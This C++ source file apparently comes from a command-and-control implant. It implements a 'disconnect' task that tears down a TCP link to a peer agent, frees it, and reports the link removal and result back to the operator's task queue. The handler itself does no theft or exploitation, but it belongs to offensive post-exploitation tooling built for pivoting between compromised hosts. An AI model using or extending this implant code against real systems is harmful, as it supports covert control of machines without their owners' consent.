#include <common.h>
#include <commands.h>
#include <transport_tcp.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_DISCONNECT

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_disconnect(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t agent_uuid_len = 0;
    auto agent_uuid = parser_string( params, &agent_uuid_len );

    if ( !agent_uuid || agent_uuid_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing agent id" ) ) );
        return;
    }

    auto ts = static_cast<TcpLinkState*>( inst.tcp_link_state );

    instance::TcpLink* prev = nullptr;
    instance::TcpLink* cur  = inst.tcp_links;
    bool found = false;

    while ( cur ) {
        if ( cur->agent_id && agent_uuid_len > 0 &&
             str_ncmp( cur->agent_id, agent_uuid, agent_uuid_len ) == 0 ) {

            if ( ts && cur->socket != TCP_INVALID_SOCKET ) {
                ts->ws.pclosesocket( cur->socket );
            }

            if ( prev ) {
                prev->next = cur->next;
            } else {
                inst.tcp_links = cur->next;
            }

            DBG_PRINT( inst, "tcp_disconnect: removed link_id=%d agent=%s\n",
                cur->link_id, cur->agent_id );

            auto pkg = package_create( inst );
            if ( pkg ) {
                package_add_byte( inst, pkg, ACTION_LINK_REMOVE );
                package_add_int32( inst, pkg, cur->link_id );
                package_add_string( inst, pkg, cur->agent_id );

                uint32_t data_len = 0;
                auto data = package_build( pkg, &data_len );

                uint32_t needed = inst.response_queue.length + 4 + data_len;
                if ( needed > inst.response_queue.capacity ) {
                    uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
                    while ( new_cap < needed ) new_cap *= 2;
                    inst.response_queue.buffer = static_cast<uint8_t*>(
                        inst.heap_realloc( inst.response_queue.buffer, new_cap )
                    );
                    inst.response_queue.capacity = new_cap;
                }

                auto buf = inst.response_queue.buffer + inst.response_queue.length;
                buf[0] = (data_len >> 24) & 0xFF;
                buf[1] = (data_len >> 16) & 0xFF;
                buf[2] = (data_len >> 8)  & 0xFF;
                buf[3] = data_len & 0xFF;
                memory::copy( buf + 4, data, data_len );
                inst.response_queue.length += 4 + data_len;

                package_destroy( inst, pkg );
            }

            if ( cur->agent_id ) inst.heap_free( cur->agent_id );
            if ( cur->hostname ) inst.heap_free( cur->hostname );
            inst.heap_free( cur );

            found = true;
            break;
        }
        prev = cur;
        cur  = cur->next;
    }

    if ( found ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "disconnected" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "agent not found in tcp links" ) ) );
    }
}

#endif
